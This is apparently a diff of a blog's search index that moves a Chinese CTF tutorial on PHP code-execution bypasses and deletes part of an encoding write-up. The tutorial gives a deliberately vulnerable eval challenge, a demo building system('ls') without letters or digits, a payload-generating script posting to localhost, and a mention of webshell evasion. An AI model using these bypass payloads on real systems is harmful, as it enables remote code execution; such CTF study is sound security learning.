@@ -257,6 +257,43 @@
       </tags>
   </entry>
   <entry>
+    <title>代码执行绕过总结</title>
+    <url>/2022/03/02/blog0005-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>这一篇大概总结一下常见的代码执行的一些技巧，其中很大一部分应该都是CTF中才会用使用的技巧了。</p>
+<span id="more"></span>
+<h2 id="一php代码执行">一、PHP代码执行</h2>
+<h3 id="基础使用">1.1、基础使用</h3>
+<p>PHP常见的代码执行手段主要有两种，eval 和 assert。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span> 	: 	PHP的语言结构，可以将字符串作为代码内容执行<br><span class="hljs-keyword">assert</span>	:	在PHP5时可以作为PHP的函数，许多常见的免杀Webshell也以<span class="hljs-keyword">assert</span>作为动态函数来实现攻击。<br>			在PHP7修改为PHP的语言结构，不能使用动态函数来进行利用了<br></code></pre></td></tr></table></figure>
+<h3 id="动态函数免杀">1.2、动态函数免杀</h3>
+<p>PHP的一个特性就是动态函数。</p>
+<h3 id="无字母数字webshell">1.3、无字母数字Webshell</h3>
+<p>当字母和数字被过滤的时候，我们有的时候也可以考虑用PHP字符串位运算绕过的形式。</p>
+<p>在PHP中"abc"|"abc"会将两个字符串转成ASCII二进制形式，如0x616263|0x616263 = 0x616263</p>
+<p>例题：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>分析题目我们发现可以 | 运算符以及引号没有被过滤，因此我们可以选择使用位运算绕过。</p>
+<p>我们要注意的是，如果我们只是将system('ls')通过位运算实现，这样的话输出的结果只会是 system('ls'), PHP会在eval中计算得到的字符串，但是并不会执行语句。等价于，eval执行的是echo("system('ls')");</p>
+<p>要在PHP中利用字符串实现动态函数。我们可以先做个小实验：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>,<span class="hljs-number">1</span>);            <span class="hljs-comment">//错误信息</span><br>ini_set(<span class="hljs-string">&#x27;display_startup_errors&#x27;</span>,<span class="hljs-number">1</span>);    <span class="hljs-comment">//php启动错误信息</span><br>error_reporting(-<span class="hljs-number">1</span>);                    <span class="hljs-comment">//打印出所有的 错误信息</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">customError</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span></span>)</span>&#123; <br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;b&gt;Error:&lt;/b&gt; [<span class="hljs-subst">$errno</span>] <span class="hljs-subst">$errstr</span>&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">//set error handler</span><br>set_error_handler(<span class="hljs-string">&quot;customError&quot;</span>);<br><span class="hljs-variable">$c</span> = (<span class="hljs-string">&#x27;system&#x27;</span>)(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;(&#x27;\x13\x19\x13\x14\x05\x0d&#x27;|&#x27;\x60\x60\x60\x60\x60\x60&#x27;)(&#x27;\x0c\x13&#x27;|&#x27;\x60\x60&#x27;)&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$d</span>);&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+<p>当利用eval执行时，<span class="math inline">\(d从字符串变为执行语句（直观点的理解就是最外层的引号没了），等价于\)</span>c。</p>
+<p>最后附上py脚本（如果只是一次的话，没必要生成文件，直接字典存在内存里就行了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">formDictionary</span>():</span><br>    ch_sum = []<br>    <span class="hljs-comment"># 找到符合条件的字符</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>        ch = <span class="hljs-built_in">chr</span>(i)<br>        re1 = re.match(<span class="hljs-string">r&quot;[0-9]|[a-z]|[A-Z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&quot;</span>,ch)<br>        <span class="hljs-keyword">if</span>(re1 == <span class="hljs-literal">None</span>):<br>            ch_sum.append(ch)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dic.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> fout:<br>        result= []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ch_sum:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> ch_sum:<br>                x = <span class="hljs-built_in">ord</span>(i)|<span class="hljs-built_in">ord</span>(j)<br>                <span class="hljs-keyword">if</span>(x&gt;=<span class="hljs-number">32</span> <span class="hljs-keyword">and</span> x&lt;=<span class="hljs-number">126</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> x <span class="hljs-keyword">in</span> result)):<br>                    result.append(x)<br>                    <span class="hljs-comment">#warning 这可能导致无法构造出\t,字符串split</span><br>                    fout.write(<span class="hljs-string">&quot;%&#123;:0&gt;2x&#125;\t%&#123;:0&gt;2x&#125;\t&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(i),<span class="hljs-built_in">ord</span>(j),<span class="hljs-built_in">chr</span>(x)))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">formStr</span>(<span class="hljs-params">s</span>):</span><br>    s1=<span class="hljs-string">&quot;&quot;</span><br>    s2=<span class="hljs-string">&quot;&quot;</span><br>    dic = &#123;&#125;<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dic.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fin:<br>        <span class="hljs-keyword">for</span> lines <span class="hljs-keyword">in</span> fin:<br>            elem = (lines.split(<span class="hljs-string">&#x27;\t&#x27;</span>))<br>            dic[elem[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)] = (elem[<span class="hljs-number">0</span>],elem[<span class="hljs-number">1</span>])<br>        <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">if</span>(dic.get(i)!=<span class="hljs-literal">None</span>):<br>                s1 += dic[i][<span class="hljs-number">0</span>]<br>                s2 += dic[i][<span class="hljs-number">1</span>]<br>               <span class="hljs-comment"># print(&quot;&#123;&#125; : &#123;&#125;|&#123;&#125;&quot;.format(i,dic[i][0],dic[i][1]))</span><br>            <span class="hljs-keyword">else</span>:<br>                sys.exit(<span class="hljs-string">&quot;No answer&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;(\&#x27;&quot;</span>+s1+<span class="hljs-string">&quot;\&#x27;|\&#x27;&quot;</span>+s2+<span class="hljs-string">&quot;\&#x27;)&quot;</span><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    formDictionary()<br>    s0 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;function : &quot;</span>)<br>    s1 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;argc : &quot;</span>)<br>    s0_encode= formStr(s0)<br><br>    <span class="hljs-keyword">if</span> s1 == <span class="hljs-string">&quot;&quot;</span>:<br>        s1_encode = <span class="hljs-string">&quot;()&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        s1_encode=formStr(s1)<br><br>    <span class="hljs-comment"># warning : eval()需要补充 -&gt; ;</span><br>    <span class="hljs-built_in">print</span>(s0_encode+s1_encode + <span class="hljs-string">&quot;;&quot;</span>)<br><br>    <span class="hljs-comment"># data=&#123;</span><br>    <span class="hljs-comment">#    &#x27;cmd&#x27;:urllib.parse.unquote(s0_encode + s1_encode + &quot;;&quot;)		#注意使用quote</span><br>    <span class="hljs-comment"># &#125;</span><br>    <span class="hljs-comment"># proxies = &#123;</span><br>    <span class="hljs-comment">#     &quot;http&quot; : &quot;127.0.0.1:8080&quot;</span><br>    <span class="hljs-comment">#     #&quot;http:&quot; : &quot;127.0.0.1:8080&quot;</span><br>    <span class="hljs-comment"># &#125;</span><br><br>    <span class="hljs-comment"># warning: 采用字符串的方式避免urlencode</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;<br>    data1 = <span class="hljs-string">&quot;cmd=&quot;</span> + s0_encode + s1_encode + <span class="hljs-string">&quot;;&quot;</span><br><br>    r = requests.post(url=<span class="hljs-string">&quot;http://localhost/www.mytest.cn/&quot;</span>,data=data1,headers=headers)<br>    <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+<h2 id="二python代码执行">二、Python代码执行</h2>
+<h3 id="基础使用-1">1.1、基础使用</h3>
+<p>Python代码执行也主要依赖两个函数，分别是eval和exec。</p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>RCE</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Web</tag>
+        <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow-xss-wp</title>
     <url>/2022/02/23/blog0004-ctfshow-xss-wp/</url>
     <content><![CDATA[<p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
@@ -427,43 +464,6 @@
         <tag>wp</tag>
         <tag>xctf</tag>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代码执行绕过总结</title>
-    <url>/2022/03/02/blog0005-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<p>这一篇大概总结一下常见的代码执行的一些技巧，其中很大一部分应该都是CTF中才会用使用的技巧了。</p>
-<span id="more"></span>
-<h2 id="一php代码执行">一、PHP代码执行</h2>
-<h3 id="基础使用">1.1、基础使用</h3>
-<p>PHP常见的代码执行手段主要有两种，eval 和 assert。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span> 	: 	PHP的语言结构，可以将字符串作为代码内容执行<br><span class="hljs-keyword">assert</span>	:	在PHP5时可以作为PHP的函数，许多常见的免杀Webshell也以<span class="hljs-keyword">assert</span>作为动态函数来实现攻击。<br>			在PHP7修改为PHP的语言结构，不能使用动态函数来进行利用了<br></code></pre></td></tr></table></figure>
-<h3 id="动态函数免杀">1.2、动态函数免杀</h3>
-<p>PHP的一个特性就是动态函数。</p>
-<h3 id="无字母数字webshell">1.3、无字母数字Webshell</h3>
-<p>当字母和数字被过滤的时候，我们有的时候也可以考虑用PHP字符串位运算绕过的形式。</p>
-<p>在PHP中"abc"|"abc"会将两个字符串转成ASCII二进制形式，如0x616263|0x616263 = 0x616263</p>
-<p>例题：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<p>分析题目我们发现可以 | 运算符以及引号没有被过滤，因此我们可以选择使用位运算绕过。</p>
-<p>我们要注意的是，如果我们只是将system('ls')通过位运算实现，这样的话输出的结果只会是 system('ls'), PHP会在eval中计算得到的字符串，但是并不会执行语句。等价于，eval执行的是echo("system('ls')");</p>
-<p>要在PHP中利用字符串实现动态函数。我们可以先做个小实验：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>,<span class="hljs-number">1</span>);            <span class="hljs-comment">//错误信息</span><br>ini_set(<span class="hljs-string">&#x27;display_startup_errors&#x27;</span>,<span class="hljs-number">1</span>);    <span class="hljs-comment">//php启动错误信息</span><br>error_reporting(-<span class="hljs-number">1</span>);                    <span class="hljs-comment">//打印出所有的 错误信息</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">customError</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span></span>)</span>&#123; <br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;b&gt;Error:&lt;/b&gt; [<span class="hljs-subst">$errno</span>] <span class="hljs-subst">$errstr</span>&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">//set error handler</span><br>set_error_handler(<span class="hljs-string">&quot;customError&quot;</span>);<br><span class="hljs-variable">$c</span> = (<span class="hljs-string">&#x27;system&#x27;</span>)(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;(&#x27;\x13\x19\x13\x14\x05\x0d&#x27;|&#x27;\x60\x60\x60\x60\x60\x60&#x27;)(&#x27;\x0c\x13&#x27;|&#x27;\x60\x60&#x27;)&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$d</span>);&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
-<p>当利用eval执行时，<span class="math inline">\(d从字符串变为执行语句（直观点的理解就是最外层的引号没了），等价于\)</span>c。</p>
-<p>最后附上py脚本（如果只是一次的话，没必要生成文件，直接字典存在内存里就行了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">formDictionary</span>():</span><br>    ch_sum = []<br>    <span class="hljs-comment"># 找到符合条件的字符</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>        ch = <span class="hljs-built_in">chr</span>(i)<br>        re1 = re.match(<span class="hljs-string">r&quot;[0-9]|[a-z]|[A-Z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&quot;</span>,ch)<br>        <span class="hljs-keyword">if</span>(re1 == <span class="hljs-literal">None</span>):<br>            ch_sum.append(ch)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dic.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> fout:<br>        result= []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ch_sum:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> ch_sum:<br>                x = <span class="hljs-built_in">ord</span>(i)|<span class="hljs-built_in">ord</span>(j)<br>                <span class="hljs-keyword">if</span>(x&gt;=<span class="hljs-number">32</span> <span class="hljs-keyword">and</span> x&lt;=<span class="hljs-number">126</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> x <span class="hljs-keyword">in</span> result)):<br>                    result.append(x)<br>                    <span class="hljs-comment">#warning 这可能导致无法构造出\t,字符串split</span><br>                    fout.write(<span class="hljs-string">&quot;%&#123;:0&gt;2x&#125;\t%&#123;:0&gt;2x&#125;\t&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(i),<span class="hljs-built_in">ord</span>(j),<span class="hljs-built_in">chr</span>(x)))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">formStr</span>(<span class="hljs-params">s</span>):</span><br>    s1=<span class="hljs-string">&quot;&quot;</span><br>    s2=<span class="hljs-string">&quot;&quot;</span><br>    dic = &#123;&#125;<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dic.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fin:<br>        <span class="hljs-keyword">for</span> lines <span class="hljs-keyword">in</span> fin:<br>            elem = (lines.split(<span class="hljs-string">&#x27;\t&#x27;</span>))<br>            dic[elem[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)] = (elem[<span class="hljs-number">0</span>],elem[<span class="hljs-number">1</span>])<br>        <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">if</span>(dic.get(i)!=<span class="hljs-literal">None</span>):<br>                s1 += dic[i][<span class="hljs-number">0</span>]<br>                s2 += dic[i][<span class="hljs-number">1</span>]<br>               <span class="hljs-comment"># print(&quot;&#123;&#125; : &#123;&#125;|&#123;&#125;&quot;.format(i,dic[i][0],dic[i][1]))</span><br>            <span class="hljs-keyword">else</span>:<br>                sys.exit(<span class="hljs-string">&quot;No answer&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;(\&#x27;&quot;</span>+s1+<span class="hljs-string">&quot;\&#x27;|\&#x27;&quot;</span>+s2+<span class="hljs-string">&quot;\&#x27;)&quot;</span><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    formDictionary()<br>    s0 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;function : &quot;</span>)<br>    s1 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;argc : &quot;</span>)<br>    s0_encode= formStr(s0)<br><br>    <span class="hljs-keyword">if</span> s1 == <span class="hljs-string">&quot;&quot;</span>:<br>        s1_encode = <span class="hljs-string">&quot;()&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        s1_encode=formStr(s1)<br><br>    <span class="hljs-comment"># warning : eval()需要补充 -&gt; ;</span><br>    <span class="hljs-built_in">print</span>(s0_encode+s1_encode + <span class="hljs-string">&quot;;&quot;</span>)<br><br>    <span class="hljs-comment"># data=&#123;</span><br>    <span class="hljs-comment">#    &#x27;cmd&#x27;:urllib.parse.unquote(s0_encode + s1_encode + &quot;;&quot;)		#注意使用quote</span><br>    <span class="hljs-comment"># &#125;</span><br>    <span class="hljs-comment"># proxies = &#123;</span><br>    <span class="hljs-comment">#     &quot;http&quot; : &quot;127.0.0.1:8080&quot;</span><br>    <span class="hljs-comment">#     #&quot;http:&quot; : &quot;127.0.0.1:8080&quot;</span><br>    <span class="hljs-comment"># &#125;</span><br><br>    <span class="hljs-comment"># warning: 采用字符串的方式避免urlencode</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;<br>    data1 = <span class="hljs-string">&quot;cmd=&quot;</span> + s0_encode + s1_encode + <span class="hljs-string">&quot;;&quot;</span><br><br>    r = requests.post(url=<span class="hljs-string">&quot;http://localhost/www.mytest.cn/&quot;</span>,data=data1,headers=headers)<br>    <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
-<h2 id="二python代码执行">二、Python代码执行</h2>
-<h3 id="基础使用-1">1.1、基础使用</h3>
-<p>Python代码执行也主要依赖两个函数，分别是eval和exec。</p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>RCE</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Web</tag>
-        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -1032,50 +1032,6 @@ O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"lov
       </tags>
   </entry>
   <entry>
-    <title>NSSCTF-常用编码-wp</title>
-    <url>/2022/04/28/blog0017-NSSCTF-%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81-wp/</url>
-    <content><![CDATA[<p>编码这种东西太多了，这次其实主要是学习一下<code>base</code>编码的一些东西</p>
-<span id="more"></span>
-<h4 id="swpuctf-2021crypto7md5">[SWPUCTF 2021]crypto7（md5）</h4>
-<p>编码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-number">69f</span>7906323b4f7d1e4e972acf4abfbfc<br></code></pre></td></tr></table></figure>
-<p>全部为16进制的数字，但是显然有几个不是在ASCII范围内，应该不是16进制转换。</p>
-<p>观察发现长度为32，意味着可能是MD5编码，尝试使用MD5在线解密。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">https://www.cmd5.com/<br></code></pre></td></tr></table></figure>
-<p>得到结果。</p>
-<h4 id="swpuctf-2021crypto8ciphey">[SWPUCTF 2021]crypto8（ciphey）</h4>
-<p>编码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-number">73E-30</span>U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`<br></code></pre></td></tr></table></figure>
-<p>答案是<code>Uuencode</code>，不过我们可以直接工具一把子过了</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 -m ciphey -t &#x27;73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`&#x27;<br></code></pre></td></tr></table></figure>
-<p>直接拿到答案</p>
-<h4 id="afctf-2018basebase循环编码">[AFCTF 2018]BASE（base循环编码）</h4>
-<p>这道题给了一个很大的文件，我拿出第一行，发现反复在<code>base64/32/16</code>中解码，这显然直接求助于Python脚本</p>
-<p>我最开始写了一个基于异常处理的，后来看到Xenny大佬的脚本，觉得很好，这里附上：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re,base64<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag_encode.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> fin:<br>    data = fin.read()<br><br>b16_dict = <span class="hljs-string">r&quot;^[A-F0-9=]*$&quot;</span><br>b32_dict = <span class="hljs-string">r&quot;^[A-Z2-7=]*$&quot;</span><br>b64_dict = <span class="hljs-string">r&quot;^[A-Za-z0-9/+=]*$&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    t = data.decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#123;&#x27;</span> <span class="hljs-keyword">in</span> t:<br>        <span class="hljs-built_in">print</span>(t)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> re.match(b16_dict,t):<br>        data = base64.b16decode(t)<br>    <span class="hljs-keyword">elif</span> re.match(b32_dict,t):<br>        data = base64.b32decode(t)<br>    <span class="hljs-keyword">elif</span> re.match(b64_dict,t):<br>        data = base64.b64decode(t)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;寄&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
-<h4 id="bjdctf-2020basebase64编码原理">[BJDCTF 2020]base??（base64编码原理）</h4>
-<p>这道题给了一个字典，如果了解<code>base64</code>的编码原则，大概可以猜到，这段密文是基于这个字典，按照<code>base64</code>的原则编码的。</p>
-<p>附上我的python 脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re,base64<br><br><span class="hljs-built_in">dict</span> = &#123;<span class="hljs-number">0</span>: <span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-number">1</span>: <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-number">2</span>: <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-number">3</span>: <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-number">5</span>: <span class="hljs-string">&#x27;O&#x27;</span>,<br>        <span class="hljs-number">6</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-number">7</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-number">9</span>: <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-number">10</span>: <span class="hljs-string">&#x27;z&#x27;</span>,<br>        <span class="hljs-number">11</span>: <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">12</span>: <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">13</span>: <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-number">14</span>: <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-number">15</span>: <span class="hljs-string">&#x27;E&#x27;</span>, <br>        <span class="hljs-number">16</span>: <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-number">17</span>: <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-number">18</span>: <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-number">19</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-number">20</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <br>        <span class="hljs-number">21</span>: <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-number">22</span>: <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-number">23</span>: <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-number">24</span>: <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-number">25</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <br>        <span class="hljs-number">26</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">27</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">28</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">29</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-number">30</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <br>        <span class="hljs-number">31</span>: <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-number">32</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-number">33</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">34</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-number">35</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <br>        <span class="hljs-number">36</span>: <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">37</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-number">38</span>: <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-number">39</span>: <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-number">40</span>: <span class="hljs-string">&#x27;Y&#x27;</span>, <br>        <span class="hljs-number">41</span>: <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-number">42</span>: <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-number">43</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">44</span>: <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">45</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <br>        <span 